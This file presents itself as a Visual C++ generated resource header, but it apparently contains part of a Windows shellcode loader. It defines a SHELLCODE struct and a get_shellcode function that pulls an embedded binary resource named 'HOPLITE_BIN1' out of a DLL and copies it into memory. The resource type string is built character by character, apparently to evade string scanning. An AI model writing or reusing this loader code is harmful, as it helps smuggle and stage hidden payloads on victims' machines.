#pragma once
#include <Windows.h>

//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by resource.rc
//
#define IDR_HOPLITE_BIN1                101

// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        102
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1001
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif

typedef struct SHELLCODE {
    char* buf;
    size_t size;
} SHELLCODE, * PSHELLCODE;

/////////////////////////////////////////////////////////////////////////////////////////////////
// Returns a pointer to a SHELLCODE structure. Grabs the shellcode out of the binary's resources

PSHELLCODE get_shellcode(HINSTANCE hinstDLL) {

    HRSRC scResource;
    SIZE_T scSize;
    HGLOBAL scResourceData;

    char s_Resource[] = { 'T', 'Y', 'P', 'E', 'L', 'I', 'B', 0x00 };

    if ((scResource = (HRSRC)FindResourceA(hinstDLL, MAKEINTRESOURCE(IDR_HOPLITE_BIN1), s_Resource))) {
        scSize = SizeofResource(hinstDLL, scResource);
        scResourceData = (HGLOBAL)LoadResource(hinstDLL, scResource);

        if (!scResourceData) return NULL;

        char* sc = (char*)malloc(scSize);

        if (!sc) return NULL;

        memcpy(sc, scResourceData, scSize);

        PSHELLCODE shellcode = (SHELLCODE*)malloc(sizeof * shellcode);

        if (!shellcode) {
            return NULL;
        }

        shellcode->buf = (char*)sc;
        shellcode->size = scSize;

        return shellcode;
    }
    return NULL;
}